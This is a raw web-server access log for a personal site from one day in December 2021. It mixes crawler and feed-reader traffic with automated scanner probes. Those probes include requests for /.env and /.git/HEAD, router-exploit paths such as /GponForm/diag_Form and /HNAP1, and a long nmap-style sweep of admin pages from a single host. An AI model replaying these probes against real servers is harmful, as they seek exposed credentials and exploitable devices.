136.35.101.13 - - [26/Dec/2021:02:12:00 +0000] "GET / HTTP/1.1" 301 227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"
45.137.23.232 - - [26/Dec/2021:02:35:06 +0000] "GET / HTTP/1.1" 301 230 "-" "Mozilla/5.0 zgrab/0.x"
183.16.102.219 - - [26/Dec/2021:02:40:08 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 301 252 "-" "Hello, World"
50.116.54.8 - - [26/Dec/2021:02:41:18 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
61.219.11.151 - - [26/Dec/2021:02:55:42 +0000] "-" 408 - "-" "-"
202.63.72.98 - - [26/Dec/2021:02:56:37 +0000] "GET /.well-known/security.txt HTTP/1.1" 301 251 "-" "Go-http-client/1.1"
202.63.72.98 - - [26/Dec/2021:02:56:39 +0000] "GET /security.txt HTTP/1.1" 301 239 "-" "Go-http-client/1.1"
45.132.227.205 - - [26/Dec/2021:03:08:29 +0000] "HEAD / HTTP/1.1" 301 - "-" "Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36"
136.144.41.117 - - [26/Dec/2021:03:09:21 +0000] "GET / HTTP/1.1" 301 230 "-" "Linux Gnu (cow)"
54.198.205.221 - - [26/Dec/2021:03:17:59 +0000] "GET / HTTP/1.1" 301 227 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
40.77.167.26 - - [26/Dec/2021:03:24:27 +0000] "GET /blog/assets_c/2010/12/IMG_20101203_000702-21.html HTTP/1.1" 301 276 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
97.107.141.188 - - [26/Dec/2021:03:41:15 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
36.91.83.57 - - [26/Dec/2021:03:54:14 +0000] "GET / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
114.119.133.30 - - [26/Dec/2021:04:26:26 +0000] "GET /blog/2011/2/3/You_stay_away_from_here!.html HTTP/1.1" 301 270 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
91.241.19.243 - - [26/Dec/2021:04:29:13 +0000] "GET / HTTP/1.1" 301 227 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1"
194.195.249.143 - - [26/Dec/2021:04:31:13 +0000] "GET /.env HTTP/1.1" 301 234 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
194.195.249.143 - - [26/Dec/2021:04:31:14 +0000] "POST / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
66.249.66.208 - - [26/Dec/2021:04:34:07 +0000] "GET /robots.txt HTTP/1.1" 301 237 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.66.18 - - [26/Dec/2021:04:34:07 +0000] "GET /blog/2014/3/2/Reversing%20the%20IT-24%20USB%20Image%20Protocol.html HTTP/1.1" 301 284 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
127.0.0.1 - - [26/Dec/2021:04:34:14 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips (internal dummy connection)"
114.119.147.116 - - [26/Dec/2021:04:37:48 +0000] "GET /robots.txt HTTP/1.1" 301 240 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
66.249.66.14 - - [26/Dec/2021:04:40:06 +0000] "GET /ads.txt HTTP/1.1" 301 234 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
45.79.148.82 - - [26/Dec/2021:04:41:16 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
216.244.66.232 - - [26/Dec/2021:05:00:27 +0000] "GET /robots.txt HTTP/1.1" 301 240 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
114.119.130.26 - - [26/Dec/2021:05:02:16 +0000] "GET /blog/tags/RLE.html HTTP/1.1" 301 245 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
118.184.177.65 - - [26/Dec/2021:05:02:26 +0000] "GET / HTTP/1.1" 301 227 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
94.232.43.63 - - [26/Dec/2021:05:16:00 +0000] "\x03" 400 226 "-" "-"
94.232.43.63 - - [26/Dec/2021:05:16:00 +0000] "\x03" 400 226 "-" "-"
112.94.98.113 - - [26/Dec/2021:05:30:01 +0000] "POST /HNAP1/ HTTP/1.0" 301 236 "-" "-"
114.119.133.30 - - [26/Dec/2021:05:31:52 +0000] "GET /blog/tags/AA-170.html HTTP/1.1" 301 248 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
93.158.90.72 - - [26/Dec/2021:05:31:59 +0000] "GET /robots.txt HTTP/1.1" 301 237 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
93.158.90.71 - - [26/Dec/2021:05:32:00 +0000] "GET /humans.txt HTTP/1.1" 301 237 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
93.158.90.69 - - [26/Dec/2021:05:32:00 +0000] "GET /ads.txt HTTP/1.1" 301 234 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
93.158.90.70 - - [26/Dec/2021:05:32:01 +0000] "GET / HTTP/1.1" 301 227 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
172.104.217.53 - - [26/Dec/2021:05:41:15 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
114.119.133.30 - - [26/Dec/2021:05:53:55 +0000] "GET /blog/2011/9/25/PPPRS_launches_Kickstarter.html HTTP/1.1" 301 273 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.143.152 - - [26/Dec/2021:06:00:46 +0000] "GET /blog/2014/12/7/Apple_Laptop_LED_PWM_Frequencies.html HTTP/1.1" 301 279 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
186.33.65.157 - - [26/Dec/2021:06:11:38 +0000] "GET / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
114.119.130.26 - - [26/Dec/2021:06:32:03 +0000] "GET /blog/tags/PSIMD.html HTTP/1.1" 301 247 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
50.116.54.8 - - [26/Dec/2021:06:41:15 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
196.196.41.68 - - [26/Dec/2021:06:51:06 +0000] "GET / HTTP/1.1" 301 230 "-" "-"
138.197.156.68 - - [26/Dec/2021:06:53:46 +0000] "\x16\x03\x01\x01\xfc\x01" 400 226 "-" "-"
43.131.22.48 - - [26/Dec/2021:06:57:31 +0000] "GET / HTTP/1.1" 301 230 "-" "-"
157.55.39.25 - - [26/Dec/2021:07:06:15 +0000] "GET / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.23 - - [26/Dec/2021:07:29:23 +0000] "GET / HTTP/1.1" 301 227 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
2.189.222.42 - - [26/Dec/2021:07:31:46 +0000] "GET / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
157.245.70.127 - - [26/Dec/2021:07:35:18 +0000] "GET /ab2g HTTP/1.1" 400 226 "-" "-"
157.245.70.127 - - [26/Dec/2021:07:35:18 +0000] "GET /ab2h HTTP/1.1" 400 226 "-" "-"
97.107.141.188 - - [26/Dec/2021:07:41:16 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
123.125.109.105 - - [26/Dec/2021:07:56:45 +0000] "GET / HTTP/1.1" 301 227 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
97.107.132.77 - - [26/Dec/2021:08:41:16 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
51.222.253.6 - - [26/Dec/2021:08:43:24 +0000] "GET /robots.txt HTTP/1.1" 301 237 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
207.46.13.170 - - [26/Dec/2021:08:51:56 +0000] "GET / HTTP/1.1" 301 228 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
121.36.106.49 - - [26/Dec/2021:09:14:43 +0000] "GET / HTTP/1.1" 301 227 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0"
198.98.49.124 - - [26/Dec/2021:09:18:40 +0000] "GET / HTTP/1.1" 301 230 "-" "Linux Gnu (cow)"
67.169.72.106 - - [26/Dec/2021:09:35:52 +0000] "GET / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
40.77.167.26 - - [26/Dec/2021:09:40:14 +0000] "GET /datasheets/hammerspace/CX9200.PDF HTTP/1.1" 301 260 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
50.116.54.8 - - [26/Dec/2021:09:41:15 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
146.0.75.206 - - [26/Dec/2021:09:54:49 +0000] "GET / HTTP/1.0" 301 227 "-" "-"
146.0.75.206 - - [26/Dec/2021:09:54:56 +0000] "GET / HTTP/1.1" 301 238 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:54:56 +0000] "GET /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42 HTTP/1.1" 301 279 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:54:56 +0000] "GET / HTTP/1.1" 301 238 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:54:56 +0000] "GET /nmaplowercheck1640512495 HTTP/1.1" 301 262 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:54:56 +0000] "GET /Portal0000.htm HTTP/1.1" 301 252 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:54:56 +0000] "GET /.git/HEAD HTTP/1.1" 301 247 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:54:56 +0000] "GET /RyX9 HTTP/1.1" 301 242 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:54:56 +0000] "GET /Portal/Portal.mwsl HTTP/1.1" 301 256 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:54:56 +0000] "GET /server-status HTTP/1.1" 301 251 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:54:56 +0000] "GET /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000 HTTP/1.1" 301 279 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:54:56 +0000] "GET /__Additional HTTP/1.1" 301 250 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:54:56 +0000] "GET /favicon.ico HTTP/1.1" 301 249 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:54:56 +0000] "GET / HTTP/1.0" 301 227 "-" "-"
146.0.75.206 - - [26/Dec/2021:09:54:56 +0000] "GET /pools/default/buckets HTTP/1.1" 301 259 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:54:56 +0000] "GET /HNAP1 HTTP/1.1" 301 243 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:54:56 +0000] "GET / HTTP/1.1" 301 238 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:54:56 +0000] "GET /CSS/Miniweb.css HTTP/1.1" 301 253 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:54:56 +0000] "POST /sdk HTTP/1.1" 301 241 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:54:56 +0000] "GET /docs/cplugError.html/ HTTP/1.1" 301 259 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:54:56 +0000] "POST /scripts/WPnBr.dll HTTP/1.1" 301 255 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:54:56 +0000] "GET /base.cgi HTTP/1.1" 301 246 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:54:56 +0000] "GET /pools HTTP/1.1" 301 243 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:54:56 +0000] "HEAD / HTTP/1.1" 301 - "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:54:56 +0000] "GET /index.cgi HTTP/1.1" 301 247 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:54:57 +0000] "GET /home.html HTTP/1.1" 301 247 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:54:57 +0000] "GET / HTTP/1.1" 301 238 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:54:57 +0000] "GET /index.jsp HTTP/1.1" 301 247 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:54:57 +0000] "GET /menu.shtml HTTP/1.1" 301 248 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:54:57 +0000] "GET /main.shtml HTTP/1.1" 301 248 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:54:57 +0000] "GET /readme.txt HTTP/1.1" 301 248 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:54:57 +0000] "GET /main.cfm HTTP/1.1" 301 246 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:54:58 +0000] "GET /admin.shtml HTTP/1.1" 301 249 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:54:58 +0000] "GET /default.aspx HTTP/1.1" 301 250 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:54:58 +0000] "GET /indice.asp HTTP/1.1" 301 248 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:54:58 +0000] "GET /localstart.cgi HTTP/1.1" 301 252 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:54:58 +0000] "GET /admin.pl HTTP/1.1" 301 246 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:54:58 +0000] "GET /localstart.shtml HTTP/1.1" 301 254 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:54:59 +0000] "GET default.asp HTTP/1.1" 400 226 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:54:59 +0000] "GET /default.html HTTP/1.1" 301 250 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:54:59 +0000] "GET /main.jsa HTTP/1.1" 301 246 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:54:59 +0000] "GET /default.jsa HTTP/1.1" 301 249 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:54:59 +0000] "GET /start.php HTTP/1.1" 301 247 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:54:59 +0000] "GET /start.aspx HTTP/1.1" 301 248 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:54:59 +0000] "GET /default.cfm HTTP/1.1" 301 249 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:00 +0000] "GET /admin.jsp HTTP/1.1" 301 247 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:00 +0000] "GET /admin.jsa HTTP/1.1" 301 247 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:00 +0000] "GET /menu.cfm HTTP/1.1" 301 246 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:00 +0000] "GET /home.php HTTP/1.1" 301 246 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:00 +0000] "GET /home.pl HTTP/1.1" 301 245 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:00 +0000] "GET /start.jsp HTTP/1.1" 301 247 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:01 +0000] "GET /admin.jhtml HTTP/1.1" 301 249 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:01 +0000] "GET /localstart.php HTTP/1.1" 301 252 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:01 +0000] "GET /index.asp HTTP/1.1" 301 247 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:01 +0000] "GET /indice.shtml HTTP/1.1" 301 250 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:01 +0000] "GET /admin.html HTTP/1.1" 301 248 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:01 +0000] "GET /start.asp HTTP/1.1" 301 247 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:01 +0000] "GET /admin.cgi HTTP/1.1" 301 247 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:02 +0000] "GET /localstart.pl HTTP/1.1" 301 251 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:02 +0000] "GET /indice.aspx HTTP/1.1" 301 249 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:02 +0000] "GET /default.jhtml HTTP/1.1" 301 251 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:02 +0000] "GET /start.html HTTP/1.1" 301 248 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:02 +0000] "GET /inicio.html HTTP/1.1" 301 249 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:02 +0000] "GET /inicio.cgi HTTP/1.1" 301 248 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:03 +0000] "GET /indice.jsa HTTP/1.1" 301 248 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:03 +0000] "GET /admin.asp HTTP/1.1" 301 247 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:03 +0000] "GET /default.php HTTP/1.1" 301 249 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:03 +0000] "GET /main.cgi HTTP/1.1" 301 246 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:03 +0000] "GET /base.php HTTP/1.1" 301 246 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:03 +0000] "GET /inicio.jsa HTTP/1.1" 301 248 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:04 +0000] "GET /base.jsp HTTP/1.1" 301 246 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:04 +0000] "GET /base.asp HTTP/1.1" 301 246 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:04 +0000] "GET /home.jsa HTTP/1.1" 301 246 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:04 +0000] "GET /base.jhtml HTTP/1.1" 301 248 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:04 +0000] "GET /base.inc HTTP/1.1" 301 246 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:04 +0000] "GET /menu.asp HTTP/1.1" 301 246 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:04 +0000] "GET /default.pl HTTP/1.1" 301 248 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:05 +0000] "GET /base.cfm HTTP/1.1" 301 246 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:05 +0000] "GET /base.aspx HTTP/1.1" 301 247 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:05 +0000] "GET /indice.pl HTTP/1.1" 301 247 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:05 +0000] "GET /indice.php HTTP/1.1" 301 248 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:05 +0000] "GET /inicio.jhtml HTTP/1.1" 301 250 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:05 +0000] "GET /indice.jsp HTTP/1.1" 301 248 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:05 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
146.0.75.206 - - [26/Dec/2021:09:55:06 +0000] "GET /inicio.shtml HTTP/1.1" 301 250 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:06 +0000] "GET /main.aspx HTTP/1.1" 301 247 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:06 +0000] "GET /home.cfm HTTP/1.1" 301 246 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:06 +0000] "GET /default.shtml HTTP/1.1" 301 251 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:06 +0000] "GET /admin.aspx HTTP/1.1" 301 248 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:06 +0000] "GET /indice.jhtml HTTP/1.1" 301 250 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:06 +0000] "GET /index.pl HTTP/1.1" 301 246 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:07 +0000] "GET /localstart.jhtml HTTP/1.1" 301 254 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:07 +0000] "GET /index.shtml HTTP/1.1" 301 249 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:07 +0000] "GET /indice.cgi HTTP/1.1" 301 248 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:07 +0000] "GET /menu.jsp HTTP/1.1" 301 246 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:07 +0000] "GET /start.jhtml HTTP/1.1" 301 249 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:07 +0000] "GET /indice.cfm HTTP/1.1" 301 248 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:08 +0000] "GET /inicio.pl HTTP/1.1" 301 247 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:08 +0000] "GET /main.pl HTTP/1.1" 301 245 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:08 +0000] "GET /menu.pl HTTP/1.1" 301 245 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:08 +0000] "GET /main.html HTTP/1.1" 301 247 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:08 +0000] "GET /index.jhtml HTTP/1.1" 301 249 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:08 +0000] "GET /localstart.jsp HTTP/1.1" 301 252 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:08 +0000] "GET /start.cfm HTTP/1.1" 301 247 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:09 +0000] "GET /inicio.jsp HTTP/1.1" 301 248 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:09 +0000] "GET /admin.cfm HTTP/1.1" 301 247 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:09 +0000] "GET /inicio.cfm HTTP/1.1" 301 248 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:09 +0000] "GET /base.shtml HTTP/1.1" 301 248 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:09 +0000] "GET /base.html HTTP/1.1" 301 247 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:09 +0000] "GET /menu.html HTTP/1.1" 301 247 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:09 +0000] "GET /main.asp HTTP/1.1" 301 246 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:09 +0000] "GET /inicio.php HTTP/1.1" 301 248 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:10 +0000] "GET /index.aspx HTTP/1.1" 301 248 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:10 +0000] "GET /localstart.jsa HTTP/1.1" 301 252 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:10 +0000] "GET /indice.html HTTP/1.1" 301 249 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:10 +0000] "GET /home.jhtml HTTP/1.1" 301 248 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:10 +0000] "GET /start.cgi HTTP/1.1" 301 247 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:10 +0000] "GET /localstart.cfm HTTP/1.1" 301 252 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:10 +0000] "GET /menu.cgi HTTP/1.1" 301 246 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:10 +0000] "GET /localstart.aspx HTTP/1.1" 301 253 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:10 +0000] "GET /default.asp HTTP/1.1" 301 249 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:10 +0000] "GET /home.aspx HTTP/1.1" 301 247 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:10 +0000] "GET /base.jsa HTTP/1.1" 301 246 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:10 +0000] "GET /inicio.asp HTTP/1.1" 301 248 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:10 +0000] "GET /start.pl HTTP/1.1" 301 246 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:10 +0000] "GET /admin.php HTTP/1.1" 301 247 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:10 +0000] "GET /robots.txt HTTP/1.1" 301 248 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:10 +0000] "GET /home.cgi HTTP/1.1" 301 246 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:10 +0000] "GET /home.jsp HTTP/1.1" 301 246 "-" "curl/7.54.0"
146.0.75.206 - - [26/Dec/2021:09:55:10 +0000] "GET /home.asp HTTP/1.1" 301 246 "-" "curl/7.54.0"
